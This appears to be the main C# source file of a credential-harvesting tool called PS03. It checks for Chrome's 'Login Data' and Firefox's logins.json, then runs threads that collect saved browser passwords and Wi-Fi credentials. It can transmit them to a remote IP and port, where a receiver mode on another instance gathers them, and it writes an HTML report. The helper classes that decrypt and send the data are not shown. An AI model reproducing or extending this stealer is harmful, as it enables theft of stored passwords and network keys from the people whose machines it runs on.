using System;
using System.IO;
using System.Threading;
using PS03.CommandLineOptions;
using PS03.Network.Receive;
using PS03.PasswordOps;
using PS03.PostOp;

namespace PS03
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            var options = new Options();
            options.HandleArgs(args);


            // If the receiver is set, we should not run operations
            if (!options.Receive)
            {
                /* Check if files exists */
                Console.Write("Looking for chrome files...");
                var chromepath = Path.Combine(Environment.GetEnvironmentVariable("LocalAppData"),
                    @"Google\Chrome\User Data\Default\Login Data");
                var chromeexist = File.Exists(chromepath);
                Console.Write("\t" + chromeexist + "\n");

                Console.Write("Looking for Firefox files...");
                var fireexists = false;
                var firepath = Path.Combine(Environment.GetEnvironmentVariable("AppData"), @"Mozilla\Firefox\Profiles");
                var jsonDirs = Directory.GetDirectories(firepath);
                foreach (var profile in jsonDirs)
                {
                    fireexists = File.Exists(profile + @"\logins.json");
                    Console.WriteLine("\t" + fireexists + "\n");
                    break;
                }


                GetChrome chrome;
                GetFirefox firefox;

                Thread T_FIREFOX = null;
                Thread T_CHROME = null;
                Console.WriteLine("Starting sniffers...");
                var wifi = new GetWifi(options.Ip, options.Port, options.Transmit, options.Verbose);
                if (chromeexist)
                {
                    chrome = new GetChrome(options.Ip, options.Port, options.Transmit, options.Verbose);
                    T_CHROME = new Thread(chrome.Execute);
                    T_CHROME.Start();
                }

                if (fireexists)
                {
                    firefox = new GetFirefox(options.Ip, options.Port, options.Transmit, options.Verbose);
                    T_FIREFOX = new Thread(firefox.Execute);
                    T_FIREFOX.Start();
                }

                var T_WIFI = new Thread(wifi.Execute);

                T_WIFI.Start();

                T_WIFI.Join();
                if(chromeexist)
                    T_CHROME.Join();
                if(fireexists)
                    T_FIREFOX.Join();
                Console.WriteLine("Sniffing done.. Generating report.");
                var RepGen = DataCounter.Instance.ReportGenerator;
                RepGen.HTML();
                Console.WriteLine("Success!");
            }
            if (options.Receive)
            {
                if (options.Transmit)
                {
                    //Can't do both.
                    Console.WriteLine("Error: Can't transmit and receive on same instance");
                    Environment.Exit(0);
                }
                var receiver = new Receiver();
                receiver.Run(options.Port);
            }
        }
    }
}